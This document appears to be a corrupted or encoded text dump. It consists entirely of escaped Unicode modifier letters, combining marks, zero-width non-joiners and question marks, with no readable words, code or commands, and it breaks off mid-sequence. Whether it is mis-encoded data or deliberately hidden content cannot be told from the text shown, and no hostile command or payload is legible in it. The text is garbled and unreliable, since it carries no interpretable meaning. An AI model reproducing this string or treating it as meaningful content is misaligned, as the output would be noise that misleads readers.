02f2????\u0306????????????\u02f6\u02f3??\u200c??\u02df\u0300\u02e7\u02e7\u02df??\u200c??\u02df\u0305\u0314\u0305??\u200c????\u0305\u02ef\u200c??\u02df\u02e5??\u0315\u02ef\u02f0??\u02e6\u02ef\u02f5\u200c??\u02df????\u02df\u02f3\u200c??\u02df\u02e7\u030d??\u0315\u200c????\u0307\u02df??\u02f1\u0303????\u02e5\u02f0\u030d\u030d??\u0305\u200c????\u0306\u0305\u02f3\u02e7\u02eb\u02d6\u200c??\u200c??\u0305\u02d4\u02ef\u200c??\u02df??\u0305\u02e9\u200c??\u02df\u0310??\u0315\u02f3\u02f0??\u0307??\u0318\u200c??\u200c??\u0309\u0317??\u0302??\u0315\u200c??\u02f5\u02f0\u02eb\u02e7\u02ed??\u02ea??????\u02d6\u02f0??\u0302\u02df??\u200c??\u02df??\u02e9\u02df\u0301\u200c??\u02df\u030d\u0305????\u030c\u0308\u02f0??\u02d6\u02ea\u02e5\u0307\u0305\u02e9\u200c??\u02df\u02e5\u02e5??\u0307????\u02ef\u200c??\u02df\u02f1\u02f3\u02f5??\u030d\u0315\u02f7\u200c??\u02df??\u030d\u0307\u0305\u02ea\u200c??\u02df\u02e9??\u0315\u02f7\u02f0??\u0307??\u030a\u200c??\u200c??\u0309\u0317\u02df\u02e6\u030f\u200c??\u02df\u02f5\u02f0\u02eb\u02e7\u02ed??????????\u02d6\u02f5\u02e9\u02df\u0315\u200c??\u02df\u030d\u030f??\u02df\u02f7\u200c??\u02df\u02f7\u030b\u02e9\u0305\u200c??\u02ed\u0305\u02e7\u030d??\u02ef\u200c????\u0307\u0310\u02ef??\u0315\u200c????\u0307\u02f7\u030f\u02df??\u02eb\u0315\u02df\u0305\u02df\u0302\u02df\u02ef\u200c????\u0305\u200c????\u02f6\u02d2??\u200c??\u02df????\u0315\u02f4????\u200c??\u02df????\u02eb\u02e5\u02e9??\u02f7\u02f0????\u02f3??\u200c??\u200c????\u0315\u200c??\u02df????\u200c??\u02df??\u02d5\u200c??\u200c??\u200c??\u200c??\u02df\u02e7\u200c??\u200c????\u02d7\u200c??\u200c??\u0313\u0315\u200c??\u02df??\u02d6\u200c??\u02df??\u0311\u200c??\u200c??\u030d\u02ef\u200c??\u200c??\u200c??\u200c????\u02f7\u200c??\u200c??\u0314\u02ef\u200c??\u02df??\u02df\u02e7\u200c??\u02df\u02e5\u02e8\u0306\u02f7\u02f2????\u0313\u02d4??\u0305\u030d\u02f0??\u02f1??\u02ff\u02df\u02ef\u200c??\u0309\u0317??\u02d5\u02eb\u200c??\u02df\u02f5\u02f0\u02eb??\u02e9\u02d4\u02f7??\u02df????\u0304\u02ff??\u0309\u02e5\u02f7\u02f3\u02f3??\u200c??\u200c????\u0305\u200c??\u02df??\u02f7\u200c??\u200c??\u02f0??\u02f0\u02d7\u02e7\u0309\u0317??\u0307??\u200c??\u02df\u02f5\u02f0\u02eb??\u02ed\u02e6????????\u02d6\u0304??\u0317\u0314??\u02e6\u0307\u0314\u0317\u02e6\u0315\u0311\u02ea\u02e5\u0306\u02eb??\u02ed\u02e5????????\u02d6??\u0308\u02df\u02e7\u200c????\u0312\u0314??\u0305\u200c????\u0305\u0311\u02ff??\u0315\u02ef\u02d2\u02f5\u0304??????\u0315\u02e9\u02eb\u02df\u0305\u200c??\u02e5??\u02d6??\u200c??\u02df\u02e9??\u0316\u030d\u02f2????\u0306????????????\u0306\u0302\u02f7??\u0305\u02ef\u030a\u02f5\u0305\u0315??????\u0305\u02eb??\u02ef\u02f7\u0305\u0304\u02df??\u200c??\u02e8\u02eb\u0305??\u0302\u02f3\u200c????\u0309\u02f2????\u0305\u0309????????????\u0306\u0302\u02ea\u02ef\u0305\u0301??\u0315\u02ef\u02d2??????????\u0316??\u02e5\u02e6\u0316\u030b\u02f2\u02e7??\u02ef\u02e9\u200c????\u02f8\u02e9??\u0315\u02e6\u02e9\u0306??\u02e5\u02e7\u02e9\u02df??\u200c????\u02f2\u02e7??\u02f2??\u200c????\u02f8??\u0315\u02ef\u02d2\u02d6??\u02d5????\u0315\u200c??\u02df??\u02eb\u0315\u02df\u0315??\u0317\u200c??\u200c????\u0315\u200c????\u02f6\u02d2??\u200c??\u02df????\u0315\u02f3\u02f5??\u0315\u02ef\u02f0????\u02f3\u02e8\u200c??\u200c??\u200c??\u200c??\u02df??\u02f3\u200c??\u200c??\u0310\u200c??\u200c??\u02e7\u200c??\u200c????\u200c??\u200c??\u02df\u030a\u200c??\u200c????\u0315\u200c??\u02df??\u0301\u200c??\u200c??\u02e6\u200c??\u200c????\u0305\u030d\u0303??\u0315\u02ef\u0310\u0318\u0305\u02ef??\u02f7\u02f0\u02d6\u02d6\u02f5\u02ef\u02f8\u0306\u02f0\u02ef??\u200c??\u200c????\u200c??\u200c??\u02e5\u0306\u02eb??\u02e9\u02d5\u0305\u0300\u02e9??\u0309\u02f7??\u0315\u02ef\u0310\u0311\u02df\u02e7\u030d??\u200c??\u02df??\u0305\u02f7\u02f6\u02f5\u02df\u030d\u0305\u02d6\u02df\u0301\u200c??\u02df\u0311\u02f7??????\u02d6\u02df\u02ef\u200c????\u0316\u030e\u0300????\u0309\u0317??\u0316????\u02e6\u0317\u02f1\u02f2\u02e7\u02ed??\u0313\u200c????\u02f8??\u0315\u02ef\u0310\u0305\u0316\u02d2\u0310??\u02f1\u030d\u02f5??\u0315\u0301\u02f0????\u02f3??\u200c??\u200c??\u200c??\u200c??\u200c??\u0301\u200c??\u200c??\u02e6\u200c??\u200c????\u0305\u200c??\u200c??\u200c??\u200c????\u02ef??\u02ef\u200c????\u0307\u02f7\u030f\u02e9\u02d2\u030d\u200c????\u02eb\u0315??\u02df??\u0301\u02df\u0305\u200c????\u200c??\u02df??\u02f6\u02d2??\u200c??\u02df????\u0315\u02d7??\u02df\u0305\u200c??????\u02eb\u02ef\u02e9??\u030d\u02f0??\u0309\u02f3\u02f1\u200c??\u200c??\u02d7\u0305??\u200c??\u02df\u0311\u200c??\u02df??\u0318\u02df\u02ef\u200c??\u030e\u02ef??\u200c??\u02e5\u02ef\u200c??\u02df??\u02f6\u200c??\u200c??\u0311\u200c??\u200c????\u02ef\u200c??\u02df??\u02d7\u200c??\u200c??\u02f0\u02ef??\u200c??????\u200c??\u200c??\u200c??\u200c??\u02df\u030f\u200c??\u200c??\u02eb\u02d6??\u200c??????\u200c??\u200c??\u02f8\u200c??\u200c??????\u200c??\u02df??\u030d\u02df\u02ef\u200c????\u02df\u030d\u200c??\u02df\u02f7\u030b??\u0316\u02eb\u02ed\u02e9\u02d4\u02f7??\u02e7\u02df\u030e\u02e8\u02d2??\u02f0\u0306??\u02f5??\u02e9\u0304\u0305\u02f7\u200c??\u02df\u02ef\u02eb??\u02e6\u02ef??\u200c??\u02df\u0300\u02e8\u02ef\u02ff\u02f2??\u0315\u02f7\u02f7\u02f5\u02e8\u02eb\u02e6\u02f7\u02ef\u0311\u0302??\u0315\u02d2\u02d2\u0304\u0304????????\u02d2\u02e6\u200c??\u02df??\u0302\u02df\u02ef\u200c????\u0311\u02e6\u030b\u0307\u02f3??\u02ea\u02df\u0309\u0304????\u02eb\u02ed\u02ed\u02e5\u02f2??????\u02d6\u02f0??\u0317??\u02d7\u02df\u02ef\u200c??\u0309\u0317\u02df\u0306\u02d3\u0315\u200c??\u02f5\u02f1\u0314\u030e??\u02f6\u02f3\u0305\u200c??\u02df??\u02e9\u0305\u0306??\u02df\u0315\u200c??\u02e5??\u02d2??\u200c??\u02df??\u0302\u02df\u02eb\u200c????\u0311\u02e5??\u0315\u0315\u02f2??\u0316\u02eb\u02e9\u02e6\u0315\u02d2\u02f2??\u0308\u0305\u0312????????\u0301\u0316??\u200c??\u02df\u030d\u02f2??????\u02e9\u0302\u02ef\u02eb\u200c????\u0311\u02f0??\u02e8\u02eb\u02f2??\u02f0??\u02e9\u0302\u02df\u02eb\u200c????\u0311\u02f0????\u0302\u02f7\u0309\u0316????\u02f7\u02f0\u02eb\u02e5\u02e6??\u02eb\u02ed\u02ed\u02df\u02e6??????\u02d6\u02f0????\u030a\u02f7??\u0315\u0315\u02f0??\u0306\u02d6\u0304\u02f6\u0316??\u02e5\u02e7\u02eb????\u200c????\u0304??????\u0305??\u0315\u0301\u02f0????\u02df\u0303\u02df\u02ef\u200c??\u0309\u0317??\u02f3??\u0315\u200c??\u02f5\u02f0\u02eb\u02ed\u02ed??\u02f2??????\u02d6\u02f0??\u0306\u02d6\u0305\u02f6\u0317\u0315\u02f4??\u02f0\u02df\u0305\u02f2\u0305??\u200c??\u02e8\u02eb\u0305\u0303????\u200c????\u0309\u02f2??\u0308\u0307\u02d2??\u0314????\u02e6\u0315\u0309\u0310\u02d7\u02f0??\u02e6\u02e6\u0315\u02d7\u0307??\u02ef\u030e??\u02df\u0315\u200c??\u02e5\u0316??\u02eb\u02e8\u02f0\u0302\u02f7??\u0315\u0317\u02f2??\u02ef\u02f4??\u02df\u0305\u200c????????\u02f5\u200c??\u200c??\u0304\u0305\u02e7\u200c??\u02df\u02ef\u0305\u030a\u0305\u200c??\u02df\u02e8????\u02df\u0305\u200c????????\u02ed\u200c??\u200c??\u0309??\u02df\u0304\u0304????\u0302\u02f7\u02f5\u02df\u02f2??\u0316\u02d6\u02e8??\u0315\u02d2\u02d2\u0300??\u02d5????\u0316??\u02ea\u0302\u02ef\u02eb\u200c????\u0313\u02ed\u02ff\u02f0\u02eb\u02e7??\u0316\u02eb\u02e8??\u02ef\u02d6\u0305\u02e5\u02ef??\u200c??\u02e8\u02eb\u0305\u0303\u02f5\u02eb\u200c????\u0309\u02f2??\u0308\u0306\u02e8??\u0314??????\u02ef\u02f0??\u02e7\u02ef\u200c??\u02df\u02f0??????\u02ef\u030e??\u02df\u0315\u200c??\u02e5\u0316??\u02eb??\u02ef\u0302\u02f7??\u02ef\u030a\u02f8\u0309????\u02f0????\u02ef??\u200c??\u02df\u0300??\u02ef\u0309\u02f0????\u0305\u0304??\u02f4\u0305\u02f0??????\u02f2\u02f7\u0302??\u0314??\u0305\u200c????\u0307\u02f7\u02f8??\u0315\u02d2\u02d2????\u02d5????\u0316??\u02e8????\u0305\u02f2??\u02f0\u0305\u02f2??\u0308\u0308????\u0304??????\u02ef\u0309\u02f0??\u0318??\u02e8\u02e6\u0315??\u02f2??\u0308\u0308\u0314??\u0304??????\u02f0\u02df\u0304??\u02d3\u02eb\u0305\u02f5\u02ff\u02e7\u200c????\u0309\u0310\u02d5??????\u0302\u02f1??\u200c??\u02df??\u0314??\u0315\u200c????\u0305??????\u0315\u200c????\u02e6\u02ef??\u200c??\u02df\u0300??\u0315\u030a??\u02e7\u200c??\u200c??\u02ff\u02e7\u02f5??\u0315\u02d2\u02d2\u0313????????\u0315\u030a??\u02e7\u200c??\u200c??\u02f1\u030d\u02f2\u02eb\u02df\u02eb\u02df\u02d3\u0315\u200c??\u200c??\u0309\u200c??????????\u200c??\u02df????\u02eb\u02e5\u02e9\u0318\u02d2\u02f0??\u02f3\u02f3\u02ea\u200c??\u200c????\u0315\u200c??\u02df\u02e9??\u200c??\u200c??\u0304\u200c??\u200c??\u030d\u0315\u200c??\u02df??\u02f3\u200c??\u02df??\u0306\u200c??\u200c??\u200c??\u200c??\u02df??\u02f3\u200c??\u02df??\u02e6\u200c??\u200c??\u02f5\u02ef\u200c??\u02df\u02e5\u02d2\u200c??\u02df??\u02ef??\u0315\u200c????\u0307\u02f7\u02f5??\u0315\u02f3\u0310\u0315\u0306\u02f7\u02e9??\u02ef\u02f7\u0305\u0316\u02ef\u200c??\u02df\u02e8\u02eb\u0305\u0318\u02d7\u030d\u200c????\u0309\u02f2??\u02f1\u0313\u0313\u02df\u0315\u02f0\u0306\u02e6\u0317\u02f0\u02f8??\u030b????\u02df\u02ef\u200c??\u200c??\u02f3\u200c??\u200c??\u02ff??\u0315\u02f3\u0310\u030b????\u02e5\u02e7??\u02eb\u200c??\u02df??\u02f2\u02e7\u02e8\u0302\u0317\u200c????\u02f8\u02e9??\u0315\u02f6??\u0316??\u02e5\u02e6????\u02f2\u02e7\u02e8\u02e9\u02f2\u200c????\u02f8??\u0315\u02f3\u02d2\u0302????????\u0315\u02e9\u02eb\u02df\u0305\u200c??\u02e5??\u02d6\u02f3\u200c??\u02df\u02e9??\u0316\u02d6\u02e9??\u0315\u02f3\u02d2\u02f6????????\u0315\u02f7\u02f6\u02f5\u02df\u030d\u0304\u02e7\u02df\u0315\u0300??\u02f0\u02d2\u02e7\u02e5\u030a\u0311\u02e8\u02f5\u02f2\u02e7\u02f4??\u02ef\u02f7\u0305??\u02ef??\u200c??\u02e8\u02eb\u0305??\u02eb\u200c??\u02df??\u0309\u02f2??\u02f2\u0305\u02d3??????????\u02ef\u02f7\u0304\u0303\u02f8\u02eb\u0305??\u0302\u0305\u200c????\u0309\u0310\u02d5\u02df\u0301\u030f\u02e5??\u02eb??\u02ed??\u02ea??????\u02d6\u02df??\u0318\u02df??\u02df??\u0311??\u200c??\u02df\u02e9\u200c??\u02df\u02f0\u0304\u0305\u02e7\u200c??\u02df\u02ef\u02f2??\u030c\u02d2??\u200c??\u02df????\u0315\u0301\u0310\u02f2??????\u02f0\u02ef\u0315\u200c??\u02df????\u200c??\u200c??\u0314\u02ef\u200c??\u02df??\u02d2\u200c??\u02df??\u0307\u200c??\u200c????\u02ef\u200c??\u02df??\u0309\u200c??\u02df????\u200c??\u200c??\u0306\u0305\u200c??\u02df\u02e7\u0311\u200c??\u02df??\u02d7\u200c??\u200c??\u0301\u200c??\u200c??\u200c??\u200c??\u02df??\u02ef??\u200c??\u02df??\u0307\u02f7\u02f0??\u0306\u02d7\u02eb\u0309\u0317??\u030c\u0317\u0315\u200c??\u02f5\u02f0\u02eb??\u02e9\u02d5\u02ef\u02f5??\u0306??\u02e5\u02e7\u02e6\u02d2??\u200c????\u02f2\u02e7??\u02f0\u0308\u200c????\u02f8??\u0315\u02f3\u0310\u030d\u02df\u02d2????\u0305\u02f0\u0306\u02e6\u0318??\u02f8??\u030b????\u02df\u02ef\u200c??\u02df??\u02e7\u200c??\u200c??\u02f0??\u0306\u02d6??\u0309\u0317??\u02f2\u02e9\u200c??\u02df\u02f5\u02f0\u02eb??\u02ed\u02e6\u0314??????\u02d6\u02f0??\u0317\u02df\u02f0\u02df\u02ef\u200c??\u0309\u0317??\u0317\u02e5\u02ef\u200c??\u02f5\u02f1\u0314\u030e??\u0305\u02ea????\u02ef\u02d2\u200c??\u02df??\u02e7??\u0316\u02f7\u02f2??\u02f2\u0306\u02f8????????\u02df\u0305\u02eb????\u02f1\u0305\u02f4\u200c??\u02df\u02e9??\u0316\u02f7\u02f2??\u02f2\u0306\u02e6??????????\u0306\u0302\u02f7??\u0305\u02d2??\u02e8\u02f4\u030d????\u0305\u02ef\u02e8\u02f5\u02df??\u02f0??\u0316\u02d7\u02f4\u0309\u0317??\u0300??\u02ef\u200c??\u02f5\u02f0\u02eb??\u02ed??\u0304??????\u02d6\u02e8\u02e5????\u0312??\u02f0\u02d6\u02e8??\u0315\u02f3\u02d2\u02e5\u0304??????\u0316??\u02e6\u02e6??\u02d4\u02f2\u02e7\u02e8\u02d7??\u200c????\u02f8\u02e9??\u0315\u02e6\u02e9\u0306??\u02e6\u02e7\u02ed\u0301\u200c??\u02df??\u02f2\u02e7\u02ea\u030f??\u200c????\u02f8??\u0315\u02f3\u02d2\u02d7\u0304\u02d5????\u0315\u02df\u02f2\u02eb\u02df\u0301\u02df\u0305\u0315??\u200c??\u02df\u0311\u200c????????\u02df\u0305\u200c??????\u02eb??\u0304\u0305\u02ef\u200c??\u02df\u02ef\u02f2??\u0307\u0312\u02e9??\u02ef\u02f0????\u0305\u200c??\u02df??\u02e7\u200c??\u02df??\u0303\u200c??\u200c??\u030c\u02ef\u200c??\u02df\u02e5\u02f3\u200c??\u02df????\u200c??\u200c??\u02d3\u0305\u200c??\u02df??\u0315??\u200c????\u02ef\u200c??\u200c????\u0315\u200c??\u02df??\u0315??\u200c??\u02df\u02ff\u02df\u02ef\u200c??\u200c??\u200c??\u02df??\u0315\u200c??\u02df????\u200c??\u200c????\u02df??\u200c??\u02df\u02f7\u030b\u02e6\u0306\u02eb??\u02e9\u02d5\u02f7\u02f5??\u0306\u02f7\u02f2????\u0313\u0314\u02df\u0315\u02f0\u0306\u02e6??\u030e\u02f8??\u030b????\u02df\u0315\u200c??\u02df??\u02e7\u200c??\u200c??\u0304\u200c??\u200c??\u02e7\u0305\u200c??\u02df??????\u02e7??\u0301\u200c??\u02df??\u02f2\u02e7\u02eb\u030f\u0315\u200c????\u02f8??\u0315\u02ef\u0310\u0306????\u02e5\u02e6??\u02f1\u02f2\u02e7??\u0303\u030b\u200c????\u02f8\u02e9??\u02d6\u02ff\u02e9??\u0315\u02f7\u02e9??\u0309\u0304\u02e6\u02df\u0311\u02f0??\u0306\u02d6\u0308\u0309\u0317????\u0304\u02ef\u200c??\u02f5\u02f0\u02eb??\u02ed??\u0318??????\u02d6??\u02e9??\u02f7\u200c??\u02df\u030d\u02ea??\u02ef\u02f3\u0305\u0311\u0305??\u200c??\u02e8\u02eb\u0305\u030c\u030c\u200c??\u02df??\u0309\u02f2????\u0306\u02df????????\u02df\u0307\u0305\u02f6\u200c??\u02df\u02e9??\u0316????\u02e7??\u02df??\u200c????\u02f2\u02e7??\u02e7\u0311\u200c????\u02f8??\u0315\u02ef\u02d2\u02e8????????\u0315\u02e7\u030d\u02e5\u200c??\u02df??\u0305\u0311\u02f0??\u02f1\u02df\u02f6\u02df\u02ef\u200c??\u0309\u0317??\u0314\u0300\u0305\u200c??\u0304\u0305\u02e7\u200c??\u02df\u02ef\u0305\u02f4\u0315\u02e7\u200c??\u02e6\u02d2??\u200c??\u02df??\u02e7??\u0301??\u200c????\u02f2\u0304\u0305\u02e7\u200c??\u02df\u02ef\u0304\u02e6\u02d3??\u0305\u02e7\u02ea\u02e7\u200c??\u02df??\u0304\u030c\u02f4\u0309\u02f2????\u0308\u0308??\u0314??????\u0306\u0302\u02f7??\u0305\u02eb\u030a\u02f5\u0305\u0315??????\u0305\u02eb??\u02ef\u02f7\u0304\u02f4\u02f8\u02eb\u0305\u0309\u0306\u02f3\u200c????\u0309\u02f2????\u0308????\u0314????????\u0306\u0302\u02ea\u02ef\u0309\u0304??\u0306\u02eb??\u02ed\u02ea\u0304??????\u02d6\u02f0??\u02f1\u02df??\u02df\u0305\u200c??\u0309\u0317??\u030c\u02f3\u02ef\u200c??\u02f5\u02f1\u0314\u030e??\u0317\u030d\u02f0??\u02f1??\u02f6\u200c??\u200c??\u0309\u0316????\u02e7??\u0301\u200c??\u02df??\u02f2\u02f5\u02f0\u02eb??\u02ed\u02e7????????\u02d6\u02df??\u0318\u02df\u02e5\u02df??\u0311\u200c??\u200c??\u02eb\u200c??\u02df\u02f0\u0304\u0305\u02ef\u200c??\u02df\u02ef\u02f2??\u02e6\u02d2??\u200c??\u02df????\u0315\u02f3\u0300??\u02ef\u030a????\u0305\u200c??\u02df\u02e8\u02e7\u200c??\u02df??\u0313\u200c??\u200c??\u02ea\u0305\u200c??\u02df\u02e7\u0311\u200c??\u02df??\u02e7\u200c??\u200c??\u200c??\u200c??\u200c??\u200c??\u200c????\u02ea\u200c??\u200c??\u0309\u0305\u200c??\u02df??\u0315\u200c??\u200c??\u02f5??\u0306????\u02e6\u0318??\u02f2\u02e7\u02e5\u0308\u02ed\u200c????????\u200c??\u02df????\u02df??\u02df\u02ef\u200c??\u0304\u0305\u02ef\u200c??\u02df\u02ef\u0305??\u02df??\u200c??\u02e8\u02eb??\u02f5\u02f1??\u0312\u200c??\u200c??\u02f6\u02d3??\u02f8??\u02f1\u0313\u0309??\u02ef\u02d2??\u02f7\u02f0\u02d6\u030c\u02f5\u02ef\u02f8\u0306\u02f0\u02ef??\u200c??\u200c????\u200c??\u200c??\u02e5\u0305??\u0310\u0308\u0306\u02d6\u02e8\u02e9??\u0309\u02f0??\u02f1??\u02e7\u02df\u02ef\u200c??\u0309\u0317\u02df\u02d5\u02f0\u02ef\u200c??\u02f5\u02ef??\u02d2\u0302\u0314??????\u0315\u02e9\u02eb\u02df\u0305\u200c??\u02e5\u0315\u02eb??\u0308\u02df\u02f3\u200c????\u0312\u0314\u02e5\u02ef\u200c????\u0305\u02f7\u02f6\u02f5\u02df\u030d\u0305\u0309\u200c??\u200c??\u02df\u0311\u02e6\u02e8\u02f4\u030d\u02e6\u02f5??\u0306\u0302\u02ea\u02df\u0301\u02f8??\u02f2\u0306\u02e9??????????\u0307\u0314??\u02e5\u02df??\u02d2\u02ef????????\u0317\u030d\u02f8??\u0315\u0301\u02f0????\u02f3??\u200c??\u200c????\u0315\u200c??\u200c??\u0301\u200c??\u200c??\u02e6\u200c??\u200c??\u200c??\u200c??\u200c??\u200c??\u200c????\u02ef??\u0305\u200c????\u0307\u02f7\u030f\u02ed\u02e6\u02e6??????\u02d6\u02df??\u0318\u02df??\u02df\u02ea??\u200c??\u200c????\u200c??\u02df\u02f0\u0304\u0305\u02ef\u200c??\u02df\u02ef\u02f2????\u0312\u02df??\u02f3\u02f3\u02eb\u200c??\u200c????\u200c??\u200c????\u02f3\u200c??\u02df??\u02ea\u200c??\u200c??\u02f6\u0315\u200c??\u02df??\u02d6\u200c??\u200c??\u200c??\u200c??\u02df\u02f1\u0315\u200c??\u02df??\u0315\u200c??\u200c??\u02e9\u200c??\u200c??\u02f0\u0315\u200c??\u02df\u02e6\u200c??\u200c??????\u200c??\u200c????\u02df\u02d6\u200c??\u02df\u02f7\u030b\u02e6\u0305??\u0310\u0315??\u02f7\u02e9??\u0305??\u0310\u0313\u0305\u02e7??\u02f7\u02f0\u02d7\u02d5\u02f5\u02ef\u02f8\u0306\u02f0\u02ef??\u200c??\u200c????\u200c??\u200c????\u0315??\u0310\u030e\u02f0????\u02e7??\u02d2??\u200c????\u02f2\u02e7??\u0306\u0307\u200c????\u02f8\u02e9????\u02f3??\u0316\u02d6\u02e8??\u02f1\u0313\u02ed\u02e9??\u030d\u200c??\u02df\u030d\u02ea\u02e6\u0315\u0309??\u02e9\u02d2\u02eb\u02e5????\u0305\u02e9\u02df\u0307\u02f4\u02ff\u02df\u030a\u0305\u02f7\u02f6\u02f1\u0315\u02e6\u02e5\u02ef??\u02d2\u0300????????\u0316\u02d6\u02e9\u02e9??\u02f7\u02f0????\u02d7\u0318\u0309\u0316????\u02e6??\u02ed\u02f2\u02f5\u02ef??\u02d2\u02f5\u0314??????\u0315\u0302????\u0305\u200c??\u02df\u02f1\u030d\u02f5??\u02f2\u0306\u02eb????????\u200c??\u200c????\u0318\u02df\u02e5\u02df??\u02f7??\u200c??\u02df\u02ed\u200c??\u02df\u02f0\u0304\u0305\u02ef\u200c??\u02df\u02ef\u02f2??\u02f6\u02d2??\u200c??\u02df????\u0315\u02f7\u0310\u02ef\u0316????\u02f0\u02ef\u0315\u200c??\u02df??\u02d4\u200c??\u200c??\u0305\u200c??\u200c????\u02f7\u200c??\u200c??\u200c??\u200c??\u02df\u0311\u0315\u200c??\u02df\u02ea\u02eb\u200c??\u02df????\u200c??\u200c??\u0300\u200c??\u200c????\u200c??\u200c??\u02df\u02eb\u200c??\u200c??\u02e7\u200c??\u200c??\u02ea\u02eb\u200c??\u02df??\u02ef??\u200c??\u02df??\u0307\u02f7\u0304??\u02f0\u02eb??\u02e9\u02d5??\u02f5??\u0306????\u02e7??????\u200c????\u02f2\u02e7\u02ea\u02e7\u02f8\u200c????\u02f8??\u0315\u02ef\u0310\u030f\u02ef\u02ef??\u02f7\u02f0\u02d6??\u02f5\u02ef\u02f8\u0306\u02f0\u02ef??\u200c??\u200c??\u02f1\u200c??\u200c????\u02ef\u02f7\u0305??\u0305??\u200c??\u02e8\u02eb\u0305\u030b??\u0309\u200c????\u0309\u02f2????\u0313\u02e5\u02e6\u0307\u0314\u02d3??\u02df\u0311\u0302??\u0315\u02ef\u02d2\u0303\u0304??????\u0315\u02e7\u030d\u02e5\u0315\u200c????\u0305\u0311\u02f0??\u02f1??\u02ff\u200c??\u200c??\u0309\u0317??\u02d4\u0301\u0315\u200c??\u02f5\u02f0\u02eb??\u02ed??????????\u02d6\u02e5????\u0305\u02e9\u02df\u0317\u02f4\u02ff??\u02df\u02eb\u02e7\u02f5\u02df\u0315\u02f6??\u0315\u02ef\u02d2\u02f1\u0304??????\u0315\u0305\u02f7\u02f6\u02f6\u02d2??\u200c??\u02df??\u02e7\u02e8\u0315\u200c??\u02df????\u02df\u0305\u200c????????\u0301\u200c??\u200c??\u0309??\u02d2??\u200c??\u02df??\u02e6??\u02e5\u02f2\u02f7\u02f0\u02d7\u0316\u02f6\u02d3??\u0312????\u030d\u02f2????\u0305\u02ff????????\u02e6\u0315\u030d\u0310\u02d7\u02ef\u0302????\u0305\u200c??\u02df\u02f1\u030d\u02f0??\u0307??\u0313\u02df\u02ef\u200c??\u0309\u0317??????\u0315\u200c??\u02f5\u02f0\u02eb??\u02ed??\u0310??????\u02d6\u200c????\u02eb\u0315\u02df\u0315\u02df??\u02df\u02ef\u200c????\u0315\u200c????\u02f6\u02d2??\u200c??\u02df????\u02f6\u02d2??\u200c??\u02df????\u0315\u02ef\u02f8??\u02df\u0306????\u200c??\u200c??\u02e6\u0301\u200c??\u200c??\u0314\u200c??\u200c??\u02ea\u0315\u200c??\u200c??\u200c??\u200c????\u0307\u200c??\u200c??\u0316\u02ef\u200c??\u02df\u02e9\u02e7\u200c??\u02df??\u02f5\u200c??\u200c??\u02e6\u0317\u02ed??\u02df\u02ef\u200c??\u02df\u02f1\u02f6\u02ef??\u200c??\u02df????\u0305??\u200c??\u02df\u02e9\u0305\u02df\u02f7\u200c??\u02df\u02ef\u0303\u0308\u02ef??\u200c??\u02df??\u02e9??\u030c\u02f3??\u200c??\u02df\u0300\u02e6????\u02f2\u02e6\u200c??\u02df\u030c\u02f0\u0301\u02eb\u02e9\u02d4\u0311\u02e5\u0302\u02ef\u02eb\u200c????\u0311\u02f8\u02e7\u02ea\u02d6\u0308\u200c????\u0302??\u030c\u02f3??\u200c??\u02df\u0300\u02e5\u0317\u02df\u0318??\u0315\u200c??\u030c\u02ef\u0309\u0304\u02e6\u02d3\u02eb\u0305\u02e8\u02d5\u02eb\u200c????\u0309\u02eb\u02e9\u02d2\u02ef\u02e5\u0302\u02df\u02eb\u200c????\u0311\u02f5\u02e7\u02ea\u02ef??\u200c????\u0302??\u030c\u02f3??\u200c??\u02df\u0300??\u0317\u02df\u02f5\u02ed\u0315\u200c??\u030c\u02f0\u02f7\u02eb\u02ed\u02e5????????\u02d6\u02e5\u0302\u02ef\u02eb\u200c????\u0311\u0302\u02e7\u02e6\u02e7??\u200c????\u0302??\u030c\u02ef??\u200c??\u02df\u0300\u02e5\u0307????\u02ed\u0305\u200c??\u030c\u02f0????\u02e6??\u0317\u02f2\u02e7??\u02ea\u02f7\u200c????\u02f8????\u0305\u02d2??????????\u030c\u02f3??\u200c??\u02df\u0300\u02e5????\u0312\u02df\u02ef\u200c??\u030c\u02f0\u030b??\u02e7\u200c??\u200c??\u02f7\u02df\u02e6\u200c??\u02df????\u030c\u02f3??\u200c??\u02df\u0300\u0305\u02df\u02f3\u200c??\u02df\u02ef\u030f??????\u200c??\u02df\u02f7\u030b\u02e9\u0305\u200c????\u0318\u02df??\u02df??\u02f7\u200c??\u200c??\u02ef\u200c??\u02df\u02f0\u0304\u0305\u02e7\u200c??\u02df\u02ef\u02f2??\u030c\u02d2??\u200c??\u02df????\u0315\u0301\u0310??\u0306????\u02f0\u02ef\u0311\u200c??\u200c??\u0311\u200c??\u200c??\u0300\u0305\u200c??\u02df??\u02d2\u200c??\u200c??\u02f1\u200c??\u200c????\u0305\u200c??\u02df\u02e5\u02e7\u200c??\u200c??\u200c??\u200c??\u02df\u030c\u200c??\u200c??\u02df\u0311\u200c??\u02df????\u200c??\u200c??\u030c\u0305\u200c??\u02df??\u02df\u02f1\u200c??\u02df\u02e5\u02e8\u0306\u02d2\u02f2??\u02f1\u0314????\u0305\u030d\u02f8??\u0315\u02f3\u0310\u0313\u0315\u02ef??\u02f7\u02f0\u02d7\u02f7\u02f5\u02ef\u02f8\u0306\u02f0\u02ef??\u200c??\u200c????\u200c??\u200c????\u0306\u02eb??\u02e9\u02d4\u02f3\u0304??\u02f1\u0314\u02d2\u02e6\u0315??\u02ea??\u02ef\u02f7\u0305\u02f2\u0315??\u200c??\u02e8\u02eb\u0305????\u02d2\u200c????\u0309\u02f2??\u02f1\u0313\u02eb\u02df\u0305\u02eb\u030d\u02e6\u200c??\u02df??\u0305\u0311\u02f0??\u0307??\u02ea\u200c??\u200c??\u0309\u0317??\u02ff\u02d3\u02ef\u200c??\u02f5\u02f0\u02eb??\u02ed\u02e5????????\u02d6\u02e5????\u0305\u02e9\u02e7??\u02e7??\u200c??\u02df\u02eb\u02e7\u02e9\u0315\u200c??\u200c????\u02e7\u02e9\u0309??\u200c??\u02df\u02e7\u02e5??\u0311\u02e8\u02f5\u02f2\u02e7\u02f1??\u02ef\u0301\u0304\u0300\u02f8\u02eb\u0305\u02f6\u0303\u0309\u200c????\u0309\u02f2??\u02f2\u0306????????????\u02ef\u02f7\u0305\u02e6\u0305??\u200c??\u02e8\u02eb\u0305\u030b\u0315\u0301\u200c????\u0309\u0310\u02d4\u02ef\u0301\u030f??\u02ef\u02f7\u0305??\u0315??\u200c??\u02e8\u02eb\u0305\u0315??\u0309\u200c????\u0309\u02f2??\u02f2\u0305\u02ff????????\u200c??\u02df\u02f2\u02eb\u02df\u02ef\u02df\u02d4\u02ef\u200c??\u02df????\u200c????????\u02df\u0305\u200c??????\u02eb\u02e5\u02e9??\u02e7\u02f0??\u02f3\u02f3\u02eb\u200c??\u2